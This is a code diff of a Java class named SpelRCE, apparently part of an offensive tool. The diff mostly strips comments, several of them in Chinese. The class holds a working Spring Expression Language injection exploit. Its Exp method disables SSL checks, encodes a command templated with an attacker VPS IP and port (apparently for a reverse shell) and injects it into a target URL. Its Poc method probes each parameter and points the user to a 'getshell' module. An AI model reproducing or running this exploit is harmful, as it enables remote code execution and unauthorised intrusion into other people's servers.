@@ -49,39 +49,22 @@ public class SpelRCE {
         }
         return params.toString().split(",");
     }
-//    private String replaceInjectionPointsExp(String url, String param, String replacement) {
-//        String regex = "([?&])" + param;
-//        Pattern pattern = Pattern.compile(regex);
-//        Matcher matcher = pattern.matcher(url);
-//        return matcher.replaceAll("$1" + param + "=" + replacement);
-//    }
 
     public void Exp(ResultCallback callback) throws IOException {
         disableSSLVerification();
         String b64payload = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP,vpsPORT).getBytes());
 
         String cmdtemp = String.format(cmd,b64payload);
-        // 将 code 转换为字节数组
-        // 将字符串转换为字节数组
         byte[] bytes = cmdtemp.getBytes(StandardCharsets.UTF_8);
-        // 创建一个 StringBuilder 用于构建十六进制字符串
         StringBuilder hexString = new StringBuilder();
-        // 遍历字节数组，将每个字节转换为十六进制，并添加到 StringBuilder
         for (byte b : bytes) {
             hexString.append(String.format("0x%02x,", b));
         }
-
-        // 删除末尾的逗号
         if (hexString.length() > 0) {
             hexString.setLength(hexString.length() - 1);
         }
         String expdata = String.format(expDatatemp,hexString.toString());
-//        String[] paramNames = extractParamNames(address);
         String encodedExpData = URLEncoder.encode(expdata, StandardCharsets.UTF_8.toString());
-//        for (String paramName : paramNames) {
-//            if (paramName.isEmpty()) continue; // 防止空参数名
-            // 针对每个参数用不同的注入值进行替换
-//            String updatedUrl = replaceInjectionPointsExp(address,"", encodedExpData);
         String updatedUrl = address +  "=" + encodedExpData;
 
             try {
@@ -121,17 +104,13 @@ public class SpelRCE {
 
     public void Poc(ResultCallback callback) throws IOException {
         disableSSLVerification();
-        // 提取 URL 中所有参数名称
         String[] paramNames = extractParamNames(address);
 
-        // 遍历所有参数，针对每个参数进行注入测试
         for (String paramName : paramNames) {
-             // 防止空参数名
             if (paramName.isEmpty()){
                 text = "参数名为空，请确认再重试";
                 callback.onResult(text);
             }
-            // 针对每个参数用不同的注入值进行替换
             String updatedUrl = replaceInjectionPoints(address, paramName, pocData);
             try {
                 URL obj = new URL(updatedUrl);
@@ -147,7 +126,6 @@ public class SpelRCE {
                         response.append(inputLine);
                     }
                     in.close();
-                    // 匹配响应内容中可能的漏洞提示
                     if (response.toString().contains("25")) {
                         text = "可能存在Spel注入漏洞，请用getshell模块" + "注入参数为: " + paramName;
                         callback.onResult(text);
